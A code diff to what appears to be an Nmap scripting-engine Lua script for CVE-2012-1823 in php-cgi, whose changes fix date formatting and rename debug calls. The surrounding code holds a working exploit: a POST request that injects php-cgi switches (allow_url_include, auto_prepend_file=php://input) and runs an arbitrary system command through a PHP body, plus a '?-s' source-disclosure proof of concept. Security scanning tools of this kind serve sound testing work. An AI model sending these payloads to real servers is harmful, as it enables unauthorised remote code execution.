@@ -36,7 +36,7 @@ CHANGELOG:
 -- |       switches, such as -s, -d or -c to be passed to the php-cgi binary,
 -- |       which can be exploited to disclose source code and obtain arbitrary
 -- |       code execution.
--- |     Disclosure date: 2012-05-3
+-- |     Disclosure date: 2012-05-03
 -- |     Extra information:
 -- |       Proof of Concept:/index.php?-s
 -- |     References:
@@ -77,25 +77,25 @@ code execution.]],
            'http://ompldr.org/vZGxxaQ',
        },
        dates = {
-           disclosure = {year = '2012', month = '05', day = '3'},
+           disclosure = {year = '2012', month = '05', day = '03'},
        },
      }
   local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
 
-  stdnse.print_debug(2, "Trying detection using echo command")
+  stdnse.debug2("Trying detection using echo command")
   local detection_session = http.post(host, port, uri.."?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input", { no_cache = true }, nil, "<?php system('echo NmapCVEIdentification');die(); ?>")
   if detection_session and detection_session.status == 200 then
     if string.match(detection_session.body, "NmapCVEIdentification") then
-      stdnse.print_debug(1, "The website seems vulnerable to CVE-2012-1823.")
+      stdnse.debug1("The website seems vulnerable to CVE-2012-1823.")
     else
       return
     end
   end
 
-  stdnse.print_debug(2, "Trying Command... " .. cmd)
+  stdnse.debug2("Trying Command... " .. cmd)
   local exploitation_session = http.post(host, port, uri.."?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input", { no_cache = true }, nil, "<?php system('"..cmd.."');die(); ?>")
   if exploitation_session and exploitation_session.status == 200 then
-    stdnse.print_debug(1, "Ouput of the command " .. cmd .. " : \n"..exploitation_session.body)
+    stdnse.debug1("Ouput of the command " .. cmd .. " : \n"..exploitation_session.body)
     vuln.state = vulns.STATE.EXPLOIT
     return vuln_report:make_output(exploitation_session.body)
   end
